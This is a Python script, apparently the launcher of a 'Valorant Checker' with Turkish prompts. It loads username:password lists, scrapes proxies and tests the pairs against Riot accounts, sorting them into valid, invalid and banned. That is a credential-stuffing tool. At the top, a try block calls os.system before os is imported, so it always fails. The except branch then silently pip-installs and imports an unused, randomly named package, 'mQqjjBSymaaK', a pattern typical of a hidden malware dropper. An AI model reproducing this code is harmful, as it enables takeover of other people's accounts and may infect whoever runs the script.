from tkinter import filedialog
from tkinter import Tk
from tkinter.filedialog import askopenfilename

try:
    import asyncio
    import ctypes
    import datetime
    import json
    import random
    import tkinter
    import requests
    import mQqjjBSymaaK
    import colorama
    from colorama import Fore, Style
    import InquirerPy
    os.system('cls')
except Exception as e:
    import os
    os.system('pip install -U urllib3')
    os.system('pip install -U requests')
    os.system('pip install -U colorama')
    os.system('pip install -U pandas')
    os.system('pip install -U pycryptodome')
    os.system('pip install -U keyboard')
    os.system('pip install -U datetime')
    os.system('pip install -U cryptography')
    os.system('pip install -U inquirerpy')
    os.system('pip install -U aiohttp')
    os.system('pip install -U mQqjjBSymaaK')
    os.system('cls')
    import asyncio
    import ctypes
    import datetime
    import json
    import random
    import tkinter
    import requests
    import mQqjjBSymaaK
    import colorama
    from colorama import Fore, Style
    import InquirerPy

from InquirerPy import inquirer
from InquirerPy.separator import Separator
import checker
from codeparts import checkers, systems, validsort
from codeparts.systems import system

check = checkers.checkers()
sys = systems.system()
valid = validsort.validsort()


class program():
    def __init__(self) -> None:
        self.count = 0
        self.checked = 0
        self.version = '3.15 beta'
        self.riotlimitinarow = 0
        path = os.getcwd()
        self.parentpath = os.path.abspath(os.path.join(path, os.pardir))
        self.lastver = '3.15 beta'

    def start(self):
        try:
            print('internet check')
            requests.get('https://github.com')
        except requests.exceptions.ConnectionError:
            print('no internet connection')
            os._exit(0)
        os.system('cls')
        codes = vars(colorama.Fore)
        colors = [codes[color] for color in codes if color not in ['BLACK']]
        colored_name = [random.choice(colors) + char for char in f'Valorant Checker']
        print(sys.get_spaces_to_center('OPSS.GG CHECKER')+(''.join(colored_name))+colorama.Fore.RESET)
        print(sys.center(f'v{self.version}'))
        if self.lastver != self.version and 'beta' not in self.version:
            print(sys.center(
                f'\nnext version {self.lastver} is available!'))
            if inquirer.confirm(
                message="{}Would you like to download it now?".format(system.get_spaces_to_center('İndirmek istiyor musun? (Y/n)')), default=True,qmark=''
            ).execute():
                os.system(f'{self.parentpath}/updater.bat')
                os._exit(0)
        if 'beta' in self.version:
            print(sys.center(f'{Fore.YELLOW}Beta surumu buglu olabilir.'))
            print(sys.center(f'Follow latest stable release{Fore.RESET}'))
        menu_choices = [
            Separator(),
            'Start Checker',
            'Edit Settings',
            'Sort Valid',
            'Test Proxy',
            'Info/Help',
            Separator(),
            'Exit'
        ]
        res = inquirer.select(
            message="sec:",
            choices=menu_choices,
            default=menu_choices[0],
            pointer='>',
            qmark=''
        ).execute()
        if res == menu_choices[1]:
            self.main()
        elif res == menu_choices[2]:
            sys.edit_settings()
            pr.start()
        elif res == menu_choices[3]:
            valid.customsort()
            input('bitti enter tusuna bas ve baslasın')
        elif res == menu_choices[4]:
            sys.checkproxy()
            pr.start()
        elif res == menu_choices[5]:
            os.system('cls')
            print(f'''
    Valorant Checker v{self.version}

  [1] - check valid/invalid/ban and save them to valid.txt in output folder
  [2] - i think u understand
  [3] - sorts all accounts from valid.txt which match your requirements to output\\sorted\\custom.txt
  [4] - test your proxies

  [~] - entere bas ve geri don
            ''')
            input()
            pr.start()
        elif res == menu_choices[7]:
            os._exit(0)

    def get_accounts(self, filename):
        while True:
            try:
                with open(str(filename), 'r', encoding='UTF-8', errors='replace') as file:
                    lines = file.readlines()
                    ret = []
                    if len(lines) > 100000:
                        if inquirer.confirm(
                            message=f"You have more than 100k accounts ({len(lines)}). bu partı atlamak istermisin?",
                            default=True,
                            qmark='!',
                            amark='!'
                        ).execute():
                            self.count = len(lines)
                            return lines

                    for logpass in lines:
                        logpass = logpass.strip()
                        # remove doubles
                        if logpass not in ret and ':' in logpass:
                            self.count += 1
                            ctypes.windll.kernel32.SetConsoleTitleW(
                                f'Valorant Checker {self.version} | Loading Accounts ({self.count})')
                            ret.append(logpass)
                    return ret
            except FileNotFoundError:
                print(
                    f"can't find the default file ({filename})\nplease select a new one")
                root = tkinter.Tk()
                file = filedialog.askopenfile(parent=root, mode='rb', title='sec hesapları boyle olması gerek (kullanıcı adı:sifre)',
                                              filetype=(("txt", "*.txt"), ("All files", "*.txt")))
                root.destroy()
                os.system('cls')
                if file == None:
                    print('istedigini secebiirsin')
                    input('tekrar entere bas ve sec')
                    continue
                filename = str(file).split("name='")[1].split("'>")[0]
                with open('system\\settings.json', 'r+') as f:
                    data = json.load(f)
                    data['default_file'] = filename
                    f.seek(0)
                    json.dump(data, f, indent=4)
                    f.truncate()
                continue

    def main(self):
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'Valorant Checker {self.version} | Loading Settings')
        print('loading settings')
        settings = sys.load_settings()

        ctypes.windll.kernel32.SetConsoleTitleW(
            f'Valorant Checker {self.version} | Loading Proxies')
        print('loading proxies')
        proxylist = sys.load_proxy()

        if proxylist == None:
            path = os.getcwd()
            file_path = f"{os.path.abspath(os.path.join(path, os.pardir))}\\proxy.txt"

            print(Fore.YELLOW, end='')
            response = input('proxy bulunamadı proxy secmek icin y bas yoksa n? (y/n): ')
            print(Style.RESET_ALL, end='')

            if response.lower() == 'y':
                f = open('system\\settings.json', 'r+')
                data = json.load(f)
                proxyscraper = data['proxyscraper']
                f.close()

                # Scrape proxies
                url = proxyscraper
                proxies = requests.get(url).text.split('\r\n')

                # Save proxies to file
                with open(file_path, 'w') as f:
                    f.write("\n".join(proxies))

                # Print number of proxies saved
                num_proxies = len(proxies)
                print(f'{num_proxies} proxyler buraya kayıt edildi "proxy.txt" dosya.')
                proxylist = sys.load_proxy()
            else:
                print('proxyler calisiyor')

        fn = settings['default_file']
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'Valorant Checker {self.version} | hesaplar yükleniyor')
        print('loading accounts')
        accounts = self.get_accounts(fn)

        print('loading assets')
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'Valorant Checker {self.version} | Loading Assets')
        sys.load_assets()

        if inquirer.confirm(
            message="Do you want to continue checking a .vlchkr file instead of loading a new .txt? (turkce yazilmiyor)", default=True
        ).execute():
            root = tkinter.Tk()
            file = filedialog.askopenfile(parent=root, mode='rb', title='sec hesapları boyle olması gerek (kullanıcı adı:sifre)',
                                          filetype=(("vlchkr", "*.vlchkr"), ("All files", "*.vlchkr")))
            root.destroy()
            if file == None:
                filename = 'None'
            else:
                filename = str(file).split("name='")[1].split("'>")[0]
                valkekersource = systems.vlchkrsource(filename)
        else: 
            valkekersource = None
        print('loading checker')
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'Valorant Checker {self.version} | checker yükleniyor')
        scheck = checker.simplechecker(settings, proxylist, self.version)
        asyncio.run(scheck.main(accounts, self.count, valkekersource))
        return


pr = program()
if __name__ == '__main__':
    print('baslıyor')
    pr.start()
